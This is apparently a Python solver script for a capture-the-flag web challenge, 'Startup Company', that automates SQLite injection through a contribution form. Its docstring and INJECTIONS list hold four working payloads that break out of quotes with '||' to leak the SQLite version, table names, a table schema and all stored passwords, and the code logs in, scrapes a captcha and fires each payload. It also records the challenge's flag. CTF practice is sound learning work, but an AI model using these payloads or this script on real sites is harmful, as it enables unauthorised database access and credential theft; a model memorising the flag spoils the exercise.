"""Solver for challenge 108 Startup Company (picoCTF 2021, Web Exploitation).

Classic SQLite injection in the funding field. Endpoints on the live deploy:
  - POST /register.php  (fields: user, pass)
  - POST /index.php      (fields: user, pass) -> login, sets PHPSESSID,
                         page contains contribute form + dynamic captcha
  - POST /contribute.php (fields: moneys, captcha) -> 302 redirect to
                         index.php which reflects "You're latest contribution: $..."

The moneys value is interpolated into an UPDATE/SELECT query; break out of
the quotes with SQLite string concatenation (||):

  1' || (SELECT sqlite_version()) -- -
  1' || (SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master) -- -
  1' || (SELECT sql FROM sqlite_master WHERE name='startup_users') -- -
  1' || (SELECT GROUP_CONCAT(wordpass) FROM startup_users) -- -

Schema: startup_users(nameuser, wordpass, money). The flag is the wordpass of
the 'the_real_flag' user.

Verified live 2026-10-28 -> academy{1_c4nn0t_s33_y0u_66b27680}

Usage: solve_108_startup_company.py <base-url> [user] [pass]
"""
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

INJECTIONS = [
    "' || (SELECT sqlite_version()) -- -",
    "' || (SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master) -- -",
    "' || (SELECT sql FROM sqlite_master WHERE name='startup_users') -- -",
    "' || (SELECT GROUP_CONCAT(wordpass) FROM startup_users) -- -",
]


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def main(base: str, user: str, password: str) -> None:
    base = base.rstrip('/')
    jar: dict = {}
    opener = urllib.request.build_opener(NoRedirect)

    def req(path: str, data: dict | None = None) -> str:
        r = urllib.request.Request(
            base + path,
            data=urllib.parse.urlencode(data).encode() if data else None,
            headers={'Cookie': '; '.join(f'{k}={v}' for k, v in jar.items())})
        try:
            with opener.open(r, timeout=20) as resp:
                for h, v in resp.getheaders():
                    if h.lower() == 'set-cookie':
                        kv = v.split(';')[0]
                        if '=' in kv:
                            k, vv = kv.split('=', 1)
                            jar[k.strip()] = vv.strip()
                return resp.read().decode(errors='replace')
        except urllib.error.HTTPError as e:
            if e.code in (301, 302, 303, 307, 308):
                loc = e.headers.get('Location', '/index.php')
                if not loc.startswith('http'):
                    loc = base + loc
                r2 = urllib.request.Request(
                    loc, headers={'Cookie': '; '.join(
                        f'{k}={v}' for k, v in jar.items())})
                with opener.open(r2, timeout=20) as resp2:
                    return resp2.read().decode(errors='replace')
            raise

    reg = req('/register.php', {'user': user, 'pass': password})
    print('register:', len(reg))
    login = req('/index.php', {'user': user, 'pass': password})
    m = re.search(r'name="captcha" value="([0-9]+)"', login)
    print('login:', len(login), '| captcha:', m.group(1) if m else None)

    for inj in INJECTIONS:
        login = req('/index.php', {'user': user, 'pass': password})
        m = re.search(r'name="captcha" value="([0-9]+)"', login)
        cap = m.group(1) if m else '1'
        body = req('/contribute.php', {'moneys': '1' + inj, 'captcha': cap})
        hit = re.search(r'academy\{[^}]+\}|picoCTF\{[^}]+\}', body)
        if hit:
            print('FLAG:', hit.group(0))
            return
        leak = re.search(r"contribution: \$([^<]*)", body)
        print('LEAK:', (leak.group(1) if leak else body[:120]
                        ).replace('\n', ' '))
    print('no flag; inspect responses above and adjust field/endpoint names')


if __name__ == '__main__':
    base = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:8000'
    main(base,
         sys.argv[2] if len(sys.argv) > 2 else 'athena108',
         sys.argv[3] if len(sys.argv) > 3 else 'x8kP2mQ9vT')
